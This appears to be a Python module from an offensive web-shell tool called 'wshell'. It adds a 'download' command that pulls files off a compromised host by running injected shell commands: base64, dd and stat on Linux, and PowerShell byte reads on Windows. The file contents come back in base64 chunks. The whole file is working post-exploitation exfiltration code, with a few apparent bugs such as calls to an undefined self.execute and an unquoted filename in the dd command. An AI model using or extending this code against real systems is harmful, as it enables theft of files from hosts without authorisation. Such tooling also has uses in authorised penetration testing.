import argparse
import binascii
import math
from base64 import b64decode
from typing import override

from cmd2 import CommandSet, with_argparser, with_default_category

from wshell import utils, validators
from wshell.errors import UnsupportedFeatureError
from wshell.log import logger


@with_default_category("File transfer")
class DownloadFileCommandSet(CommandSet):

    argument_parser = argparse.ArgumentParser(description="Download remote file")
    argument_parser.add_argument(
        "-r", "--remote",
        metavar="FILENAME",
        required=True,
        help="Remote filename to download",
        dest="remote_filename"
    )
    argument_parser.add_argument(
        "-l", "--local",
        metavar="FILENAME",
        help="Local filename where to store the downloaded file (default: current folder, same name as remote)",
        dest="local_filename"
    )
    chunk_size_group = argument_parser.add_mutually_exclusive_group()
    chunk_size_group.add_argument(
        "-c", "--chunk",
        metavar="SIZE",
        type=validators.positive_integer,
        default=1024,
        help="Size of the chunk to download in bytes (default: %(default)s)",
        dest="chunk_size"
    )
    chunk_size_group.add_argument(
        "-n", "--no-chunk",
        action="store_false",
        help="Do not split into chunks",
        dest="use_chunks",
        default=True
    )

    def remote_file_exists(self, filename: str) -> bool:
        raise NotImplementedError
    
    def remote_file_size(self, filename: str) -> int:
        raise NotImplementedError
    
    def get_base64_encoded_file_content(self, filename: str) -> str:
        raise NotImplementedError
    
    def get_base64_encoded_chunk(self, filename: str, chunk_index: int, chunk_size: int) -> str:
        raise NotImplementedError

    @override
    def on_register(self, cmd):
        super().on_register(cmd)

        if self._cmd.injector.is_linux():
            self.remote_file_size = self.linux_remote_file_size
            self.get_base64_encoded_file_content = self.linux_get_base64_encoded_file_content
            self.get_base64_encoded_chunk = self.linux_get_base64_encoded_chunk
        elif self._cmd.injector.is_windows_psh():
            self.remote_file_size = self.windows_psh_remote_file_size
            self.get_base64_encoded_file_content = self.windows_psh_get_base64_encoded_file_content
            self.get_base64_encoded_chunk = self.windows_psh_get_base64_encoded_chunk
    
    @with_argparser(argument_parser)
    def do_download(self, args) -> None:
        if args.local_filename is None:
            args.local_filename = args.remote_filename.replace(self._cmd.injector.PATH_DELIMITER, "_")

        try:
            with open(args.local_filename, "wb") as local_file:
                if not args.use_chunks:
                    base64_encoded_file_content = self.get_base64_encoded_file_content(args.remote_filename)
                    local_file.write(b64decode(base64_encoded_file_content))
                else:
                    if self._cmd.injector.is_windows_cmd():
                        raise UnsupportedFeatureError("Chunked download is not supported on Windows Command Prompt (use -n or --no-chunk instead)")

                    file_size = self.remote_file_size(args.remote_filename)
                    total_chunks = math.ceil(file_size / args.chunk_size)
                    logger.info(f"Downloading {file_size} bytes as {total_chunks} chunks ({args.chunk_size} bytes each)")

                    for chunk_index in range(total_chunks):
                        self._cmd.poutput(f"Downloading chunk {chunk_index + 1}/{total_chunks}", end="\r")
                        base64_encoded_chunk = self.get_base64_encoded_chunk(args.remote_filename, chunk_index, args.chunk_size)
                        local_file.write(b64decode(base64_encoded_chunk))
                    
                    # TODO: verify file integrity
                    
            logger.info(f"File '{args.remote_filename}' downloaded to '{args.local_filename}'")
        except binascii.Error:
            logger.error("Error reading retrieved file content")
        except OSError as error:
            logger.error(f"Error opening local file '{args.local_filename}': {error.strerror}")

    #
    # Linux implementation
    #

    def linux_get_base64_encoded_file_content(self, filename: str) -> str:
        return self._cmd.injector.execute(f"base64 -w0 '{filename}' 2>&1")

    def linux_get_base64_encoded_chunk(self, filename: str, chunk_index: int, chunk_size: int) -> str:
        return self._cmd.injector.execute(f"dd bs={chunk_size} count=1 skip={chunk_index} if={filename} status=none | base64 -w0")

    def linux_remote_file_size(self, filename: str) -> int:
        return int(self._cmd.injector.execute(f"stat -c %s '{filename}'"))


    #
    # Windows PSH implementation
    #

    def windows_psh_get_base64_encoded_file_content(self, filename: str) -> str:
        return self.execute(f"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content '{filename}')))")

    def windows_psh_get_base64_encoded_chunk(self, filename: str, chunk_index: int, chunk_size: int) -> str:
        return self.execute(
            f"$fs = [IO.File]::OpenRead('{filename}'); \
            $fs.Seek({chunk_index}*{chunk_size}, 'Begin') | Out-Null; \
            $buf = New-Object Byte[] {chunk_size}; \
            $fs.Read($buf,0,$buf.Length) | Out-Null; \
            $fs.Close(); \
            [Convert]::ToBase64String($buf)"
        )

    def windows_psh_remote_file_size(self, filename: str) -> int:
        return self._cmd.injector.execute(f"(Get-Item -Path '{filename}').Length")
